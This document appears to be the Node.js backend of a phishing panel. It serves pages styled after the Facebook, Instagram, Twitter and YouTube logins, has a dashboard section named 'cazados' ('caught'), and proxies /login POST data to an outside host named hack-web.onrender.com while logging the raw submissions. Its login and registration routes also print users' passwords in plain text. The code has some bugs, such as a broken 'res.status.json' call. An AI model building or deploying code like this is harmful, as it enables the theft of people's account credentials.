const express = require("express");
const { createProxyMiddleware } = require("http-proxy-middleware");
const path = require("path");
const { redesSociales } = require("./DB/config");
const { registerUser, getUserByEmail } = require("./DB/firebase");
const { Buffer } = require("buffer");

const fs = require("fs");
const http = require("http");
const socketIo = require("socket.io");
const cors = require("cors");

const app = express();
const PORT = process.env.PORT || 3000;
const server = http.createServer(app);
const io = socketIo(server); // Inicializamos Socket.IO
// Middleware para servir archivos estáticos desde la carpeta "public"
app.use(express.static("public"));
// Redirige "/dashboard" a "dashboard.php" y permite que Apache lo procese
app.use(express.json());
app.use(express.urlencoded({ extended: true })); // Habilita el soporte para formularios

// Función para generar el HTML de redes sociales
const generarContenido = () => {
  return redesSociales
    .map(
      (red) =>
        `
      <button onclick="solicitarMensaje('${red.nombre}')">
      
      <div class="flex flex-col items-center justify-center p-4 bg-gray-800 rounded-lg">
            <img src="${red.img}" alt="${red.nombre}" class="w-12">
            <span class="mt-2">${red.nombre}</span>
            <span class="text-${
              red.estado === "Online" ? "green" : "red"
            }-500 mt-1">${red.estado}</span>
        </div>
        
        </button>
        `
    )
    .join("");
};
app.use(cors({ origin: '*' }));

app.get("/dashboard-ult", (req, res) => {
  console.log("dashboard XDDD")

  res.sendFile(path.join(__dirname, "public", "dasboard.html"));
});

// Ruta para obtener contenido dinámico
const rutasValidas = {
  inicio: "inicio.html",
  servidores: "servidores.html",
  tienda: "inicio.html",
  cazados: "inicio.html",
  reportes: "inicio.html",
  configuraciones: "inicio.html",
};

const archivosHTML = {
  servidores: {
    facebook: "servidor_facebook.php",
    instagram: "servidor_instagram.html",
    twitter: "servidor_twitter.html",
    youtube: "servidor_youtube.html",
  },
  user: {
    facebook: "user_facebook.html",
    instagram: "user_instagram.html",
    twitter: "user_twitter.html",
    youtube: "user_youtube.html",
  },
};

app.get("/contenido", (req, res) => {
  const { tipo, plataforma } = req.query;
  if (plataforma) {
    const archivo = archivosHTML[tipo]?.[plataforma.toLowerCase()];

    if (archivo) {
      fs.readFile(
        path.join(__dirname, "public", `pages/${archivo}`),
        "utf8",
        (err, data) => {
          if (err) {
            return res.status(500).send("Error al cargar el contenido");
          }
          res.send(data);
        }
      );
    } else {
      res.status(404).send("<h2>Contenido no encontrado</h2>");
    }
  } else {
    if (tipo) {
      const archivo = rutasValidas[tipo];

      if (archivo) {
        fs.readFile(
          path.join(__dirname, "public", archivo),
          "utf8",
          (err, data) => {
            if (err) {
              return res.status(500).send("Error al cargar el contenido");
            }
            // Reemplaza {{contenido}} con los datos dinámicos
            let contenidoDinamico = data
              .replace("{{contenido}}", generarContenido())
              .replace(
                "'variables'",
                `const servidores = ${JSON.stringify(redesSociales, null, 2)};`
              );

            res.send(contenidoDinamico);
          }
        );
      } else {
        res.status(404).send("<h2>Sección no encontrada</h2>");
      }
    }
  }
});

// Ruta para devolver solo el contenido de cada sección (sin recargar toda la página)
app.get("/contenidoXD/:seccion", (req, res) => {
  const archivo = rutasValidas[req.params.seccion];

  if (archivo) {
    fs.readFile(
      path.join(__dirname, "public", archivo),
      "utf8",
      (err, data) => {
        if (err) {
          return res.status(500).send("Error al cargar el contenido");
        }
        // Reemplaza {{contenido}} con los datos dinámicos
        let contenidoDinamico = data
          .replace("{{contenido}}", generarContenido())
          .replace(
            "{{variables}}",
            `const servidores = ${JSON.stringify(redesSociales, null, 2)};`
          );

        res.send(contenidoDinamico);
      }
    );
  } else {
    res.status(404).send("<h2>Sección no encontrada</h2>");
  }
});

app.use(
  "/dashboard",
  createProxyMiddleware({
    target: "http://localhost/dashboard.php", // Apache en el puerto 80
    changeOrigin: true,
  })
);

app.post("/auth", async (req, res) => {
  const { email, password } = req.body;
  console.log("Login", email, password)

  if (!email || !password) {
    return res.status(401).json({ error: "Usuario o contraseña incorrectos" });
  }
  var auth = await getUserByEmail({
    email: email,
    password: password,
  });

  if (auth != null) {
    res.json({ email: auth.email, nombre: auth.name });
  } else {
    return res.status(400).json({ error: "Usuario o contraseña incorrectos" });
  }
});

app.post("/register", async (req, res) => {
  const { email, name, password } = req.body;
  console.log("register", email, name, password)

  if (!email || !name || !password) {
    return res.status(400).json({ error: "Todos los campos son obligatorios" });
  }

  var auth = await registerUser({
    email: email,
    password: password,
    name: name,
  });

  if (auth) {
    res.status.json({ email: email, nombre: name });
  } else {
    return res
      .status(400)
      .json({ error: "No se puedo crear el usuario por que ya existe" });
  }
});

// Proxy SOLO para archivos PHP (redirige todas las solicitudes PHP a Apache)
app.use(
  "/",
  createProxyMiddleware({
    target: "http://localhost",
    changeOrigin: true,
    onProxyReq: (proxyReq, req, res) => {
      console.log(`📡 Petición recibida: ${req.method} a ${req.url}`);

      // Permitir el paso de datos en POST y archivos multimedia
      if (req.method === "POST" || req.method === "PUT") {
        let body = [];
        req.on("data", (chunk) => body.push(chunk));
        req.on("end", () => {
          console.log("📄 Datos enviados:", Buffer.concat(body).toString());
        });
      }
    },
    onError: (err, req, res) => {
      console.error("❌ Error en el proxy:", err);
      res.status(500).json({ error: "Error en el proxy" });
    },
  })
);


app.use(
  "/login",
  createProxyMiddleware({
    target: "https://hack-web.onrender.com/index.php", // Apache corriendo en el puerto 80
    changeOrigin: true,
    onProxyReq: (proxyReq, req, res) => {
      console.log(`📡 Petición recibida: ${req.method} a ${req.url}`);

      if (req.method === "POST") {
        let bodyData = [];

        req.on("data", (chunk) => bodyData.push(chunk));
        req.on("end", () => {
          const rawData = Buffer.concat(bodyData).toString();
          console.log("📄 Datos enviados:", rawData);

          // Si hay datos, enviarlos al proxy
          proxyReq.setHeader("Content-Length", Buffer.byteLength(rawData));
          proxyReq.write(rawData);
        });
      }
    },
    onError: (err, req, res) => {
      console.error("❌ Error en el proxy:", err);
      res.status(500).json({ error: "Error en el proxy" });
    },
  })
);


app.use(
  "/dashboard",
  createProxyMiddleware({
    target: "http://localhost/dashboard.php", // Apache en el puerto 80
    changeOrigin: true,
  })
);


// Evento de conexión de Socket.IO
io.on("connection", (socket) => {
  console.log("Un cliente se ha conectado");

  // Enviar mensaje inicial al cliente
  socket.emit("mensaje", "Este es un mensaje desde el servidor Node.js");

  // Escuchar el evento 'solicitarMensaje' desde el cliente
  socket.on("solicitarMensaje", () => {
    console.log("El cliente ha solicitado un mensaje");

    // Emitir un mensaje de vuelta al cliente
    socket.emit(
      "mensaje",
      "Aquí está el mensaje solicitado desde el servidor!"
    );
  });

  socket.on("solicitarArchivo", ({ tipo, id }) => {
    console.log(`Cliente solicita el archivo del tipo: ${tipo}, con ID: ${id}`);

    if (archivosHTML[tipo] && archivosHTML[tipo][id.toLowerCase()]) {
      const rutaArchivo = path.join(
        __dirname,
        "public",
        "pages",
        archivosHTML[tipo][id.toLowerCase()]
      );

      fs.readFile(rutaArchivo, "utf8", (err, data) => {
        if (err) {
          console.error("Error al leer el archivo:", err);
          socket.emit("errorArchivo", "No se pudo cargar el archivo.");
        } else {
          console.log("Enviado correctamente");
          socket.emit("archivoCargado", { id, contenido: data });
        }
      });
    } else {
      console.log(
        "Archivo no encontrado",
        archivosHTML[tipo][id.toLowerCase()]
      );
      socket.emit("errorArchivo", "Archivo no encontrado.");
    }
  });

  socket.on("disconnect", () => {
    console.log("Un cliente se ha desconectado");
  });
});

// Iniciar servidor
server.listen(PORT, () => {
  console.log(`🚀 Servidor corriendo en http://localhost:${PORT}`);
});
